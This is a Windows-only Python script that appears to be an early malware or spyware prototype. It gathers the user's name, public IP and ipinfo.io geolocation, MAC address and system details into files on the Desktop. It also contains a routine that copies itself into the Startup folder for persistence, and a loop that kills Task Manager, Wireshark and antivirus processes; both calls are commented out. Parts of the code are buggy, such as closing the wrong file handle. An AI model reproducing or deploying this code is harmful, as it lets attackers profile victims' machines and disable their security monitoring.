import httpx
import os
import platform
import sys
import shutil
import socket
import time
import psutil
from dotenv import load_dotenv
global API_KEY


blackListedPrograms = ["Taskmgr.exe","NortonSecurity.exe","Wireshark.exe","bdagent.exe","mcagent.exe","mbam.exe","Mbamservice.exe","wsc_proxy.exe"]


if platform.system() == "Windows":

    load_dotenv()
    API_KEY = os.getenv("TOKEN")

    value = dict(os.environ)
    userprofile = value["USERPROFILE"]
    username = value["COMPUTERNAME"]
    home = value["HOMEDRIVE"]+value["HOMEPATH"]

    while True:
        try:
            os.chdir(home+"\\Desktop\\Test")
            file = open("IPInfo.txt", "w")
            file.write(str(time.asctime(time.localtime(time.time())))+"\n")
            file.write(psutil.users()[0][0])
            file.write(" Data\n")
            file.close()
            break
        except FileNotFoundError:
            os.mkdir(home+"\\Desktop\\Test")
            continue
    def test():
        ip = httpx.get("https://ident.me").text
        statuscode = httpx.get(f"https://ipinfo.io/{ip}/json?token={API_KEY}").status_code
        if statuscode == 404:
            os.system("ipconfig /renew")
            return
        elif statuscode == 200:
            return
        
    
    def fileloc(home):
        filepath = sys.argv[0]
        try:
            if os.path.dirname(filepath) !="C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup":
                shutil.copyfile(filepath,home+"\\AppData\\Local\\Programs\\"+os.path.basename(filepath))
                shutil.move(filepath,"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
            else:
                return
        except IOError:
            raise SystemExit

    def ipinfo(info):
        file = open("IPInfo.txt","a")
        file.write(info)
        file.close()

    def ipgrabber():
        ip = socket.getaddrinfo(socket.gethostname(),0,family = socket.AF_INET)
        try:
            privateip = ip[1][4][0]
        except IndexError:
            privateip = ip[0][4][0]
        publicip = httpx.get('https://ident.me/').text
        return publicip

    def ipreq(ip):
        info = httpx.get(f"https://ipinfo.io/{ip}?token={API_KEY}").text
        return info

    def otherinfo():
        node = platform.node()
        processor = platform.processor()
        rampercent = dict(psutil.virtual_memory()._asdict())["percent"]
        try:
            macaddress = psutil.net_if_addrs()["Ethernet"][0][1]
        except KeyError:
            macaddress = psutil.net_if_addrs()["Wi-Fi"][0][1]

        while True:
            try:
                os.chdir(home+"\\Desktop\\Test")
                file_2 = open("extrainfo.txt","w")
                file_2.write(str(node)+"\n"+(processor)+"\n"+"RamUsagePercent: "+str(rampercent)+"\n"+"MacAddress: "+str(macaddress))
                file.close()
                break
            except FileNotFoundError:
                os.mkdir(home+"\\Desktop\\Test")
                continue
        return

    def currunproc():
        while True:
            try:
                lst = []
                os.chdir(home+"\\Desktop\\Test")
                file = open("RunningProcess.txt","w")
                while True:
                    lst = []
                    for proc in psutil.process_iter(['pid', 'name']):
                        lst.append(proc.info)
                    for i in range(len(lst)):
                        file.write(lst[i]["name"]+":")
                        file.write(str(lst[i]["pid"])+"\n")
                        if lst[i]["name"] in blackListedPrograms:
                            for l in range(len(blackListedPrograms)):
                                if blackListedPrograms[l] == lst[i]["name"]:
                                    psutil.Process(lst[i]["pid"]).terminate()
                        elif i == (len(lst)-1):
                            break
                    time.sleep(180)
                    continue
            except FileNotFoundError:
                os.mkdir(home+"\\Desktop\\Test")
                continue
    
    test()
    #fileloc()
    ipinfo(ipreq(ipgrabber()))
    otherinfo()
    #currunproc()

else:
    raise SystemExit

